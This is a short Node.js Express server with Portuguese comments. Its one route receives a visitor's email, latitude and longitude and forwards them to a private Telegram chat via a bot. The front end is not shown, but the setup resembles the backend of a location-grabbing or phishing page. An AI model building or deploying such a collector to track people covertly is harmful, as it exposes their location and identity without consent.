
import express from 'express';
import fetch from 'node-fetch';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';

dotenv.config();
const app = express();
const port = process.env.PORT || 3000;

// Configurações do Telegram
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// Correção para usar __dirname com ESModules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Middlewares
app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

//Servindo arquivos estáticos (HTML, CSS, JS) da pasta "public"
app.use(express.static(path.join(__dirname, '../public')));

// Rota que recebe o POST com email, lat, lng
app.post('/send', async (req, res) => {
  const email = req.body.email || 'não informado';
  const lat = req.body.lat || 'desconhecido';
  const lng = req.body.lng || 'desconhecido';

  const mensagem = `Novo acesso com localização:\n\nEmail: ${email}\nLatitude: ${lat}\nLongitude: ${lng}`;
  const locationUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendLocation`;
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: mensagem
      })
    });

    const loc = await fetch(locationUrl, {
      method: 'POST',
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        latitude: lat,
        longitude: lng
      })
    });

    const json = await response.json();
    const locationjson = await loc.json();

    if (json.ok && locationjson.ok) {
      res.send("<h3>Obrigado! Seus dados foram recebidos.</h3>");
    } else {
      res.status(500).send("Erro ao enviar para o Telegram.");
    }
  } catch (err) {
    console.error("Erro:", err);
    res.status(500).send("Erro interno.");
  }
});

// Inicia o servidor
app.listen(port, () => {
  console.log(`Servidor rodando em http://localhost:${port}`);
});
